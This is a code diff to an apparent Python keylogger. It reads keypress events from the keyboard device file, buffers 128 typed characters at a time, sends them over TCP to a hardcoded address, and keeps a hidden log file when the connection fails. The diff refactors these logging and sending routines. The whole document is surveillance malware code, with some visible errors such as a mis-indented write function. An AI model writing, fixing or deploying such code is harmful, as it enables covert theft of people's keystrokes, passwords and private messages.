@@ -15,7 +15,6 @@ RETURN_ADDR = ("192.168.0.2", 80) # This port may not always be open
 """
 Find character device file associated with keypress events using regex and device information
 """
-
 # TODO: dynamic pathfinding to account for different filesystem structures
 def get_kb_cfile():
 
@@ -40,21 +39,27 @@ def get_kb_cfile():
     return cfile_path
 
 """
-Takes name of logfile as input, and sends contents over TCP connection.
+Takes name of logfile and last 128 typed characters as input, and sends contents over TCP connection.
 Clears file's contents after read.
 """
-
 def send_logfile(sock, logfile_name, typed):
-    with open(logfile_name, "r+") as outf:
-        outf.write(typed)
+    with open(logfile_name, "r+") as outf: # read/write mode
         data = outf.readlines()
         outf.truncate(0)
         outf.close()   
 
     if data:
-        sock.sendall(encode(data))
+        sock.sendall(encode(data, "utf-8"))
 
     return
+
+"""
+Takes name of logfile and last 128 typed characters as input and writes to logfile
+"""
+def write_to_logfile(logfile_name, typed):
+    with open(logfile_name, "a") as outf: # append mode
+    outf.write(typed)
+    outf.close()
 
 
 """
@@ -125,25 +130,20 @@ def read_cfile(cfile_path):
         if len(typed) == 128: # write to file every 128 characters TODO: should this be higher?
             try:
                 if log_needs_send:
+                    write_to_logfile(logfile_name, typed)
+                    typed = "" # clear input buffer to avoid double handling when exceptions occur
                     send_logfile(sock, logfile_name, typed)
                     log_needs_send = False
                 else:
-                    sock.sendall(encode(typed)) # encode keypress data as utf-8 string (by default)
+                    sock.sendall(encode(typed, "utf-8")) # encode keypress data as utf-8 string (by default)
             except:
-                log_needs_send = True
-
                 if not os.path.exists(logfile_name): # create hidden log file
                     logfile = open(logfile_name, "w")
                     logfile.close()
 
-                with open(logfile_name, "a") as outf:
-                    outf.write(typed)
-                    typed = ""
-                    outf.close()
-
-
-    
-    
+                if typed:
+                    write_to_logfile(logfile_name, typed)
+                    log_needs_send = True
 
 """
 Establishes TCP connection with host computer, takes (HOST, PORT) tuple as input
